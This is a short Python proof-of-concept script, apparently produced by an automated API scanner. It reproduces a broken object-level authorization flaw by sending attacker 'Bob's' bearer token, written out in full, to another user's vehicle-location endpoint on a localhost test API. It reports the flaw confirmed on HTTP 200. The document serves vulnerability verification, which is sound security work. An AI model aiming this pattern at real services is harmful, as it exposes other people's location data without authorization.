#!/usr/bin/env python3
"""
Zero-Dependency PoC Reproduction Script
Finding ID: FINDING-BOLA-3FC5B163
Vulnerability: Broken Object Level Authorization in http://localhost:8888/identity/api/v2/vehicle/{vehicle_id}/location
Category: BOLA (Severity: HIGH)
Target Object: f89b5f21-7829-45cb-a650-299a61090378
Attacker: Bob

Verification Proof:
Cross-principal request by 'Bob' to object 'f89b5f21-7829-45cb-a650-299a61090378' succeeded with HTTP 200 and semantic similarity 1.00. Violated Invariants: INV_OBJECT_ISOLATION.

Instructions:
Run directly with: python reproduce_poc.py
Prerequisites: pip install requests
"""

import sys

import requests


def test_vulnerability():
    target_url = "http://localhost:8888/identity/api/v2/vehicle/f89b5f21-7829-45cb-a650-299a61090378/location"
    auth_token = "eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJib2JAZXhhbXBsZS5jb20iLCJpYXQiOjE3OTI3NDI5MDQsImV4cCI6MTc5MzM0NzcwNCwicm9sZSI6InVzZXIifQ.JpuCsxmaC-MsJ6wzHVBS-kOw5uyYiAvDYP8q5CA_A9bwnBot3afaQmgMkkDAYlZORmJD1Y0hi4XyODXcBc9HSUjaliOy3VZ9iJNIM7h86GX5Ao_rVtq4aVi5MnvTlKCYTUiuL_uU-ywbsNabL-NFtQSaGbyU6sG2TpQDXOL75fjw55IpVglYClF0d3tGZg6A81E6exabqiSbveYec2M0f_i0dGXSKQP_IOG8Tw8a9BGsmsKKRKDeId7gtccoUryIBC4-ZPsPNvZQAjdUhmhNT7CUwE2SKStVudstY_rhof5AuOqwtztBo25rd9NYi_PDsxhHy5tLz1RkZGcfWUYdNg"
    headers = {
        "Content-Type": "application/json",
        "Authorization": f"Bearer {auth_token}",
    }

    print("[*] Attacker: Bob")
    print(f"[*] Target Endpoint: {target_url}")
    response = requests.request("GET", target_url, headers=headers, timeout=10)

    print(f"[+] Response Status: {response.status_code}")
    print(f"[+] Response Body Preview: {response.text[:200]}...")

    if response.status_code == 200:
        print(
            "[!] VULNERABILITY CONFIRMED: Unauthorized cross-principal access succeeded (HTTP 200)."
        )
        return 0
    else:
        print(f"[-] Access rejected with status {response.status_code}. Invariant enforced.")
        return 1


if __name__ == "__main__":
    sys.exit(test_vulnerability())
